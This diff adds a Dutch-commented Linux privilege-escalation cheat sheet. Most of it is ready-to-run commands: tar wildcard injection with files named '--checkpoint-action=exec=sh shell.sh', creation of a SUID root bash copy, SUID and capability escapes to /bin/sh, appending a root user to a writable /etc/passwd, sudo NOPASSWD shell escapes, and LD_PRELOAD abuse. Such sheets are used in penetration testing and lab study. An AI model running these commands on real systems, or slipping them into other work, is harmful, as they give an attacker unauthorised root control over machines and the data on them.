@@ -1,0 +1,47 @@
+# Linux Privilege Escalation - Cron, SUID, Capabilities
+# === Cron Jobs ===
+# Systeem cron jobs:
+cat /etc/crontab
+ls -la /etc/cron.*
+ls -la /var/spool/cron/crontabs/
+# Zoek writable scripts die als root draaien:
+find / -path /proc -prune -o -writable -type f 2>/dev/null | grep -E '(\.sh|\.py|\.pl)'
+# Monitor nieuwe processen (pspy alternatief):
+watch -n 1 'ps aux | grep -v watch'
+# Wildcard injection (tar):
+# Als cron draait: tar czf /tmp/backup.tar.gz *
+echo "" > "--checkpoint=1"
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh
+# === SUID Binaries ===
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+# GTFOBins check (bekende SUID exploits):
+# nmap --interactive -> !sh
+# find . -exec /bin/sh -p \;
+# vim -c ':!sh'
+# python -c 'import os; os.execl("/bin/sh","sh","-p")'
+# bash -p (als bash SUID heeft)
+# cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash (via writable SUID)
+# === Capabilities ===
+getcap -r / 2>/dev/null
+# Interessante capabilities:
+# cap_setuid+ep -> python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+# cap_dac_read_search+ep -> kan alle bestanden lezen (shadow, etc.)
+# cap_net_bind_service+ep -> bind op privileged poorten
+# === Writable /etc/passwd ===
+ls -la /etc/passwd
+# Nieuwe root user toevoegen:
+openssl passwd -1 hacked
+# echo 'hacker:$1$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
+# === Sudo misconfigurations ===
+sudo -l
+# NOPASSWD entries:
+# (ALL) NOPASSWD: /usr/bin/vim -> sudo vim -c ':!sh'
+# (ALL) NOPASSWD: /usr/bin/less -> sudo less /etc/passwd -> !sh
+# (ALL) NOPASSWD: /usr/bin/find -> sudo find . -exec /bin/sh \;
+# LD_PRELOAD (als env_keep bevat LD_PRELOAD):
+# gcc -shared -fPIC -o /tmp/pe.so pe.c -nostartfiles
+# sudo LD_PRELOAD=/tmp/pe.so /usr/bin/programma
+# Tip: Gebruik https://gtfobins.github.io/ voor SUID/sudo exploits
+# Tip: pspy (https://github.com/DominicBreuker/pspy) voor cron monitoring
